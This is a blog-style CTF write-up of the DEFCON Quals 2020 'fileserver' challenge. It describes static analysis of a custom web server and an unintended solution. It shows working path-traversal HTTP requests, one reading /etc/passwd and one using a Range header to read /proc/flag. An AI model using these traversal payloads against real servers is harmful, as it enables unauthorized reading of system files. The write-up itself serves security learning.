---
title: "Pwning a DEFCON Quals binary without pwning it"
categories:
  - Blog
tags:
  - Post Formats
  - readability
  - standard
---

Story time, before getting to the write up. I played the pwnables of DEFCON Quals 2020, mainly because it's very fun, and also because I wanted to see what the content would look like, given the remote nature of the contest.

I ended up pwning all three of them, and the writeups can be found [here](https://github.com/naliferopoulos/defcon-quals-2020). Err, not exactly though. I managed to get the last flag, *fileserver*, without pwning the binary whatsoever and that ended up in a funny chat with the DEFCON staff, as well as a prize award! Thanks guys! :)

### DEFCON Qualifiers - Fileserver

For this one, we were given a domain name and a port, but no binary. Behind the remote port there was a webserver, which seemed custom made, and among other things, allowed us to download a compiled copy of itself (we figured that out later on) targeted against 32-bit Linux. 

Evidently, at the time, I though that I was supposed to pwn the binary in order to win. The challenge, just like the previous ones, instructed us to find the flag at */proc/flag*, a fact I did not mention for the previous ones, but which plays an important role for this one.

On to the write up though.

#### Huh?

At first glance, the binary looks like this:

```bash
➜  fileserver checksec target
[*] '/vagrant/DEFCON/fileserver/target'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Also, readelf shows the following, as far as symbols are concerned (basic *snip snip* has occured):

```bash
➜  fileserver readelf -s target | grep -v "@GLIB"

Symbol table '.symtab' contains 127 entries:
   Num:    Value  Size Type    Bind   Vis      Ndx Name
    38: 08048cda   218 FUNC    LOCAL  DEFAULT   14 rio_read
    39: 08049320   110 FUNC    LOCAL  DEFAULT   14 get_mime_type
    56: 0804972f    98 FUNC    GLOBAL DEFAULT   14 log_access
    58: 0804c0e0   112 OBJECT  GLOBAL DEFAULT   25 meme_types
    67: 08049498   154 FUNC    GLOBAL DEFAULT   14 url_decode
    69: 08049c5f   553 FUNC    GLOBAL DEFAULT   14 process
    74: 0804c150     4 OBJECT  GLOBAL DEFAULT   25 default_mime_type
    85: 08048f4d   979 FUNC    GLOBAL DEFAULT   14 handle_directory_request
    91: 08048db4   137 FUNC    GLOBAL DEFAULT   14 rio_readlineb
    95: 08049b8e   209 FUNC    GLOBAL DEFAULT   14 display_admin_page
   103: 08049e88   371 FUNC    GLOBAL DEFAULT   14 main
   113: 08048c59   129 FUNC    GLOBAL DEFAULT   14 writen
   114: 08049532   509 FUNC    GLOBAL DEFAULT   14 parse_request
   117: 08048c2b    46 FUNC    GLOBAL DEFAULT   14 rio_readinitb
   120: 0804938e   266 FUNC    GLOBAL DEFAULT   14 open_listenfd
   122: 080498b7   727 FUNC    GLOBAL DEFAULT   14 serve_static
   126: 08049791   294 FUNC    GLOBAL DEFAULT   14 client_error
```

The binary is fully symbolicated, but it still contains a bunch of functionality, so we are going to have to take a deeper look at this.

Before doing so, I decided to take a look at the fileserver instance running on the remote host, in order to get a better feel for the target before jumping into static analysis.

That is when I noticed a path traversal vulnerability. By issuing the following HTTP request:

```
➜  fileserver

GET /../../../../../../etc/passwd HTTP/1.0
```

I received the following response:

```
HTTP/1.1 200 OK
Accept-Ranges: bytes
Cache-Control: no-cache
Content-length: 1561
Content-type: text/plain

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
statd:x:108:65534::/var/lib/nfs:/bin/false
sshd:x:109:65534::/var/run/sshd:/usr/sbin/nologin
vagrant:x:900:900:vagrant,,,:/home/vagrant:/usr/bin/zsh
vboxadd:x:999:1::/var/run/vboxadd:/bin/false
```

That is when I got excited, and tried it against the remote host, without any luck. I could only reproduce it locally. While the vulnerability was present, I could not force the server to return the file to me. I could only list directories using the traversal. Bummer :/

I then scrapped the idea of dynamically getting a feel of the target, considering that the challenge category was pwning, and loaded the binary into IDA. After browsing around the disassembly for a bit, the following caught my attention. During *parse_request*, the binary treated incoming requests differently, based on the presence of a Range HTTP Request Header, or more accurately, **"Ran"**.

```
.text:080495BA                 sub     esp, 4
.text:080495BD                 push    400h
.text:080495C2                 lea     eax, [ebp+s1]
.text:080495C8                 push    eax
.text:080495C9                 lea     eax, [ebp+var_420]
.text:080495CF                 push    eax
.text:080495D0                 call    rio_readlineb
.text:080495D5                 add     esp, 10h
.text:080495D8                 movzx   eax, [ebp+s1]
.text:080495DF                 cmp     al, 52h ; 'R'
.text:080495E1                 jnz     short loc_8049644
.text:080495E3                 movzx   eax, [ebp+var_81F]
.text:080495EA                 cmp     al, 61h ; 'a'
.text:080495EC                 jnz     short loc_8049644
.text:080495EE                 movzx   eax, [ebp+var_81E]
.text:080495F5                 cmp     al, 6Eh ; 'n'
.text:080495F7                 jnz     short loc_8049644
.text:080495F9                 mov     eax, [ebp+arg_4]
.text:080495FC                 lea     edx, [eax+204h]
.text:08049602                 mov     eax, [ebp+arg_4]
.text:08049605                 add     eax, 200h
.text:0804960A                 push    edx
.text:0804960B                 push    eax
.text:0804960C                 lea     eax, (aRangeBytesLuLu - 804C000h)[ebx] ; "Range: bytes=%lu-%lu"
.text:08049612                 push    eax
.text:08049613                 lea     eax, [ebp+s1]
.text:08049619                 push    eax
.text:0804961A                 call    ___isoc99_sscanf
```

We can follow the bahavioral change down to **serve_static**, which in the case of a Range header present, *snprintf()'s* the selected part of the file to the response buffer, while the other code path simply skips over it in the case of a file. After all, the juicy part of the (intened solution to the) challenge was getting to the admin page (*page* as in *directory*).

Bingo! While the remote instance won't let us use the directory traversal to fetch files (this is how it was intended to be played), by supplying a range header, we could get it to do so!

```
GET /../../../../../proc/flag HTTP/1.0
Range: bytes=0-90
```

Aaaaaaand:

```
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: **redacted**
Cache-Control: no-cache
Accept-Ranges: bytes

**redacted**
```

There it is, we just got the flag using more web stuff than pwning stuff! I know that's a broad definition of what "web stuff" and "pwning stuff" is, but I contacted the DEFCON team afterwards and they informed me that this was not the inteded solution. 

Considering this, I would far more have loved to actually pwn the challenge, as it is a 400pts DEFCON Quals one, but nonetheless, the hax were for once *pretty-cool-hax™*.